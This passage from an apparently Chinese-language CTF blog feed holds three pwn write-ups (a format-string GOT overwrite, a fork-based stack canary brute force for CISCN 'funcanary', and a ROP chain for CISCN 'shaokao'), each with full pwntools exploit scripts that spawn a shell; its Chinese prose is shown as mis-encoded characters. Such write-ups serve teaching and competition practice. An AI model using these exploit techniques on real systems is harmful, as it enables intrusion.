        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-02%20171648.png"></p><p>checksecä¸‹,çœ‹ä¸‹ä¿æŠ¤</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-02%20172019.png"></p><p>å¦‚å›¾ï¼Œè¯¥å‡½æ•°å­˜åœ¨æ¼æ´ï¼Œåˆ†æä¸‹å‡½æ•°é€»è¾‘ï¼Œreadå‡½æ•°å°†è¯»å–çš„0x32ä¸ªå­—èŠ‚æ”¾å…¥s1ä¸­ï¼Œstrncmpå‡½æ•°å°†s1çš„å‰8ä¸ªå­—èŠ‚ä¸â€œwllmmllwâ€œæ¯”è¾ƒï¼Œä¸åŒè¿”å›é0ï¼Œæ‰§è¡Œprintfå‡½æ•°ï¼Œç›¸åŒè¿”å›0ï¼Œè·³å‡ºå¾ªç¯ã€‚</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-02%20175756.png"></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-02%20180034.png"></p><p>gdbè°ƒè¯•ï¼Œå‘ç°printfçš„å‚æ•°å¹¶ä¸æ˜¯å‚¨å­˜åœ¨æ ˆä¸Šï¼Œè€Œæ˜¯å‚¨å­˜åœ¨bssæ®µï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥åœ¨æ ˆä¸Šå†™å…¥å†…å®¹ï¼Œäºæ˜¯éœ€è¦å€ŸåŠ©è·³æ¿æ¥åœ¨æ ˆä¸Šå†™å…¥ç›¸åº”çš„å€¼ã€‚</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-02%20195544.png"></p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©0xffffd0f8è¿™ä¸ªè·³æ¿ï¼Œå°†0xffffd108æŒ‡å‘çš„åœ°å€ä¿®æ”¹ä¸º0xffffd0fcï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥å°†0xffffd0fcæŒ‡å‘çš„åœ°å€ä¿®æ”¹ä¸ºæˆ‘ä»¬æƒ³è¦çš„åœ°å€ã€‚ä¸ºä»€ä¹ˆè¦ä¿®æ”¹0xffffd108æŒ‡å‘çš„åœ°å€ï¼Ÿæ˜¯å› ä¸º0xffffd0fcæŒ‡å‘çš„åœ°å€é«˜ä¸¤ä¸ªå­—èŠ‚çš„åœ°å€ä¸º0x804ï¼Œä¸systemé«˜ä¸¤ä¸ªå­—èŠ‚çš„åœ°å€ä¸€è‡´ï¼Œä¾¿äºä¿®æ”¹ï¼Œè€Œä¸”è¿™ä¸ªç¨‹åºä¼šä¸€ç›´å¤„äºwhileå¾ªç¯ï¼Œæ²¡æœ‰leaveï¼ŒretæŒ‡ä»¤ï¼Œæ‰€ä»¥ä¹Ÿä¸ç”¨æ‹…å¿ƒä¿®æ”¹ä¼šç ´åç¨‹åºæ‰§è¡Œæµã€‚äºæ˜¯æˆ‘ä»¬å¯ä»¥å°†printfå‡½æ•°çš„gotè¡¨é¡¹çš„åœ°å€å†™åˆ°0xffffd0fcä¸­ã€‚åŒç†ï¼Œæˆ‘ä»¬å¯ä»¥å°†0xffffd108æŒ‡å‘çš„åœ°å€ä¿®æ”¹ä¸º0xffffd10cï¼Œå¹¶å°†printfå‡½æ•°çš„gotè¡¨é¡¹é«˜ä¸¤ä¸ªå­—èŠ‚åœ°å€å†™å…¥0xffffd10cä¸­ã€‚æœ€åï¼ŒåŒæ—¶ä¿®æ”¹printfå‡½æ•°çš„gotè¡¨é¡¹åœ°å€æŒ‡å‘çš„printfå‡½æ•°çš„åœ°å€æ”¹ä¸ºsystemå‡½æ•°çš„åœ°å€ï¼Œç„¶ååœ¨ä¸‹ä¸€æ¬¡å¾ªç¯ä¸­å¡«å…¥&#x2F;bin&#x2F;shï¼Œå®Œæˆè°ƒç”¨ã€‚printfå‡½æ•°çš„gotè¡¨é¡¹åœ°å€ä¸€å®šè¦åŒæ—¶ä¿®æ”¹ï¼Œå¦åˆ™printfå‡½æ•°çš„gotè¡¨é¡¹åœ°å€æŒ‡å‘çš„æ˜¯æ— æ•ˆçš„åœ°å€ï¼Œå¯¼è‡´ç¨‹åºçš„å´©æºƒã€‚</p><p>expå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line">p=process(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;mikokuma&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;%43$p.%6$p.&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;password: 0x&#x27;</span>)</span><br><span class="line">true_addr=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;.&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">147</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(true_addr))</span><br><span class="line"></span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;.&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">p.recv()</span><br><span class="line">offset=libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">base=true_addr-offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">sys_offset=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sys_addr=base+sys_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">payload1=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_addr&amp;<span class="number">0xffff</span>)-<span class="number">0xc</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%6$hn&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x80485AF&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Try again!\n&#x27;</span>)</span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_got))</span><br><span class="line">payload2=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(printf_got&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hn&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x80485AF&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Try again!\n&#x27;</span>)</span><br><span class="line">payload3=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_addr&amp;<span class="number">0xffff</span>)+<span class="number">0x4</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%6$hn&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x80485AF&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Try again!\n&#x27;</span>)</span><br><span class="line">payload4=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((printf_got+<span class="number">2</span>)&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hn&#x27;</span></span><br><span class="line">p.sendline(payload4)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Try again!\n&#x27;</span>)</span><br><span class="line">payload5=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys_addr&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%7$hn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((sys_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)-(sys_addr&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%11$hn&#x27;</span></span><br><span class="line">p.sendline(payload5)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Try again!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x80485AF&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023ciscn-funcanary</title>
      <link href="/posts/10017/"/>
      <url>/posts/10017/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-30%20103524.png"></p><p>checksecä¸‹,ä¿æŠ¤å…¨å¼€</p><p>ä¸»å‡½æ•°é€»è¾‘å¦‚ä¸‹</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-30%20103652.png"></p><p>å­˜åœ¨forkå‡½æ•°åˆ›å»ºå­è¿›ç¨‹</p><blockquote><p>v3 &#x3D; fork(); æ˜¯ C ç¼–ç¨‹è¯­è¨€ä¸­çš„ä¸€è¡Œä»£ç ï¼Œå®ƒè°ƒç”¨ fork() å‡½æ•°å¹¶å°†å…¶è¿”å›å€¼åˆ†é…ç»™åä¸º v3 çš„å˜é‡ã€‚ fork() å‡½æ•°é€šè¿‡å¤åˆ¶è°ƒç”¨è¿›ç¨‹æ¥åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹ã€‚ fork() å‡½æ•°è¢«è°ƒç”¨åï¼Œæ–°è¿›ç¨‹ï¼ˆç§°ä¸ºå­è¿›ç¨‹ï¼‰å°†ä¸åŸè¿›ç¨‹ï¼ˆç§°ä¸ºçˆ¶è¿›ç¨‹ï¼‰ç›¸åŒï¼Œä½†å®ƒä»¬å°†ç‹¬ç«‹æ‰§è¡Œã€‚</p><p>fork()å‡½æ•°çš„è¿”å›å€¼ç”¨äºåˆ¤æ–­è¿™æ®µä»£ç æ˜¯åœ¨çˆ¶è¿›ç¨‹ä¸­æ‰§è¡Œè¿˜æ˜¯åœ¨å­è¿›ç¨‹ä¸­æ‰§è¡Œã€‚ å¦‚æœ fork() è¿”å› 0ï¼Œåˆ™ä»£ç æ­£åœ¨å­è¿›ç¨‹ä¸­æ‰§è¡Œã€‚ å¦‚æœ fork() è¿”å›æ­£å€¼ï¼Œåˆ™ä»£ç æ­£åœ¨çˆ¶è¿›ç¨‹ä¸­æ‰§è¡Œï¼Œè¿”å›å€¼æ˜¯å­è¿›ç¨‹çš„è¿›ç¨‹ IDã€‚ å¦‚æœ fork() è¿”å› -1ï¼Œåˆ™å‘ç”Ÿé”™è¯¯å¹¶ä¸”æ²¡æœ‰åˆ›å»ºå­è¿›ç¨‹ã€‚</p></blockquote><p>è¿›å…¥sub_128A()å‡½æ•°</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-30%20103729.png"></p><p>å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ä¸”æœ‰canaryï¼Œè€ƒè™‘åˆ°æœ‰forkå‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨canaryçˆ†ç ´</p><blockquote><p>å¯¹äº Canaryï¼Œè™½ç„¶æ¯æ¬¡è¿›ç¨‹é‡å¯åçš„ Canary ä¸åŒ (ç›¸æ¯” GSï¼ŒGS é‡å¯åæ˜¯ç›¸åŒçš„)ï¼Œä½†æ˜¯åŒä¸€ä¸ªè¿›ç¨‹ä¸­çš„ä¸åŒçº¿ç¨‹çš„ Canary æ˜¯ç›¸åŒçš„ï¼Œ å¹¶ä¸” é€šè¿‡ fork å‡½æ•°åˆ›å»ºçš„å­è¿›ç¨‹çš„ Canary ä¹Ÿæ˜¯ç›¸åŒçš„ï¼Œå› ä¸º fork å‡½æ•°ä¼šç›´æ¥æ‹·è´çˆ¶è¿›ç¨‹çš„å†…å­˜ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™æ ·çš„ç‰¹ç‚¹ï¼Œå½»åº•é€ä¸ªå­—èŠ‚å°† Canary çˆ†ç ´å‡ºæ¥ã€‚</p></blockquote><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-30%20103756.png"></p><p>å­˜åœ¨åé—¨å‡½æ•°</p><p>è§£é¢˜æ€è·¯ï¼š</p><p>è®¡ç®—å‡ºcanaryè·rbpçš„åç§»ï¼Œåœ¨idaé‡Œå¯ä»¥çœ‹åˆ°ï¼Œå³0x8ï¼Œæ‰€ä»¥æˆ‘ä»¬å¡«å……0x62ä¸ªpadding+canary+0x8ä¸ªpadding+åé—¨å‡½æ•°çš„åœ°å€å°±å¯ä»¥å®Œæˆè°ƒç”¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">çˆ†ç ´Canaryçš„é€šç”¨æ¨¡æ¿</span><br><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;bash&#x27;,&#x27;-c&#x27;]</span></span><br><span class="line"><span class="comment">#context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;)</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./funcanary&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">  p = process(<span class="string">&#x27;./funcanary&#x27;</span>)</span><br><span class="line"> <span class="comment">#libc = elf.libc</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  p =remote()</span><br><span class="line">  libc = ELF()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span> //canaryçš„æœ€ä½ä½å§‹ç»ˆä¸º<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;the &quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;: &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">        p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">104</span> + canary + <span class="built_in">chr</span>(i))</span><br><span class="line">        a = p.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;have fun&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">                canary += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;canary: &quot;</span> + canary)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./funcanary&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">  p = process(<span class="string">&#x27;./funcanary&#x27;</span>)</span><br><span class="line"> <span class="comment">#libc = elf.libc</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  p =remote()</span><br><span class="line">  libc = ELF()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;the &quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;: &quot;</span> + <span class="built_in">chr</span>(i))</span><br><span class="line">        p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">104</span> + canary + <span class="built_in">chr</span>(i))</span><br><span class="line">        a = p.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;have fun&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">                canary += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;canary: &quot;</span> + canary)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">104</span> + canary + <span class="string">&#x27;A&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;\x31\x12&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023ciscn-shaokao</title>
      <link href="/posts/59067/"/>
      <url>/posts/59067/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20171853.png"></p><p>æ‹¿åˆ°ç¨‹åºï¼Œchecksecä¸‹ï¼Œpieæ²¡å¼€ï¼Œnxå’Œcanaryå¼€ç€</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20192914.png"></p><p>è¿è¡Œç¨‹åºï¼Œåˆ†åˆ«è¯•è¯•1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œå‘ç°ä¸€å¼€å§‹ä½™é¢ä¸º233ï¼Œå•¤é…’çƒ¤ä¸²ä¼šèŠ±é’±ï¼Œæ‰¿åŒ…æ‘Šä½é’±ä¸å¤Ÿ</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20193523.png"></p><p>æŠŠç¨‹åºæ”¾è¿›idaåˆ†æï¼Œå‘ç°æ‰¿åŒ…æ‘Šä½éœ€è¦100000ï¼Œä½†æ˜¯é’±ä¸å¤Ÿï¼Œç»§ç»­è§‚å¯Ÿ</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20204514.png"></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20204556.png"></p><p>çœ‹è§å•¤é…’ï¼Œä¸²çš„é’±çš„è®¡ç®—æ–¹å¼æœ‰ç¼ºé™·ï¼Œè¾“å…¥è´Ÿæ•°ï¼Œä½™é¢ä¼šå¢åŠ ï¼Œå€’è´´æ˜¯å§ğŸ˜Š</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20205601.png"></p><p>æˆç™¾ä¸‡å¯Œç¿å•¦:P</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20205804.png"></p><p>ä¹°ä¸‹æ‘Šä½åï¼Œå‡ºç°äº†æ”¹åè¿™ä¸€æ–°é€‰é¡¹ï¼Œè¿›idaçœ‹çœ‹</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20210034.png"></p><p>çœ‹è§äº†strcpyå‡½æ•°ï¼Œå°†v5å¤åˆ¶åˆ°nameï¼Œæ²¡æœ‰å¯¹å¤åˆ¶çš„å­—ç¬¦è¿›è¡Œé™åˆ¶ï¼Œscanfä¹Ÿæ²¡æœ‰å¯¹è¾“å…¥çš„å­—ç¬¦è¿›è¡Œé™åˆ¶ï¼ŒåŒæ—¶v5åªèƒ½å®¹çº³32ä¸ªå­—èŠ‚ï¼Œå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20211041.png"></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20211211.png"></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20211319.png"></p><p>è®¡ç®—å‡ºåç§»ä¸º40</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-27%20221610.png"></p><p>å› ä¸ºç¨‹åºå‡½æ•°å¾ˆå¤šï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ROPgadgetæŸ¥æ‰¾æ‰§è¡Œexecve(â€œ&#x2F;bin&#x2F;shâ€,NULL,NULL)çš„ç‰‡æ®µ</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-28%20171006.png"></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-28%20171128.png"></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-28%20171834.png"></p><p>åœ¨ç¨‹åºé‡Œæ‰¾ä¸åˆ°&#x2F;bin&#x2F;shå­—ç¬¦ä¸²,ä½†æ˜¯æˆ‘ä»¬çœ‹åˆ°çƒ§çƒ¤æ‘Šèƒ½æ”¹åï¼Œæƒ³åˆ°å°†&#x2F;bin&#x2F;shå­—ç¬¦ä¸²å†™è¿›nameç©ºé—´ã€‚</p><p>å®Œæˆå‰ç½®å·¥ä½œï¼Œä¾æ®ropçš„åŸºæœ¬æ€æƒ³ï¼Œæ„é€ payloadï¼š</p><blockquote><p>from pwn import *<br>context(log_level&#x3D;â€™debugâ€™)<br>p&#x3D;process(â€œ.&#x2F;shaokaoâ€)<br>#p&#x3D;remote(â€œ123.56.251.120â€,41843)<br>pop_rax_ret&#x3D;0x458827<br>pop_rdi_ret&#x3D;0x40264f<br>pop_rsi_ret&#x3D;0x40a67e<br>pop_rdx_rbx_ret&#x3D;0x4a404b<br>sys_call&#x3D;0x402404<br>bin_sh&#x3D;0x4E60F0<br>p.recv()<br>p.sendline(str(1).encode(â€˜utf-8â€™))<br>p.recv()<br>p.sendline(str(1).encode(â€˜utf-8â€™))<br>p.recv()<br>p.sendline(str(-100000).encode(â€˜utf-8â€™))<br>p.recv()<br>p.sendline(str(4).encode(â€˜utf-8â€™))<br>p.recv()<br>p.sendline(str(5).encode(â€˜utf-8â€™))<br>p.recv()</p><p>payload&#x3D;bâ€™&#x2F;bin&#x2F;sh\x00â€™+bâ€™Aâ€™*32<br>payload+&#x3D;p64(pop_rax_ret)+p64(0x3b)+p64(pop_rdi_ret)+p64(bin_sh)+p64(pop_rsi_ret)+p64(0)+p64(pop_rdx_rbx_ret)+p64(0)+p64(0)+p64(sys_call)<br>p.sendline(payload)<br>p.interactive()</p></blockquote><p> æ³¨æ„&#x2F;bin&#x2F;shå­—ç¬¦ä¸²åè¦ç”¨\x00æˆªæ–­ï¼Œè‡´ä½¿ç¨‹åºèƒ½æ‰§è¡Œexecve(â€œ&#x2F;bin&#x2F;shâ€,NULL,NULL)è€Œä¸æ˜¯execve(â€œ&#x2F;bin&#x2F;shaaaaaaaaâ€¦â€,NULL,NULL)</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²:ä¿®æ”¹è¿”å›åœ°å€</title>
      <link href="/posts/14994/"/>
      <url>/posts/14994/</url>
      
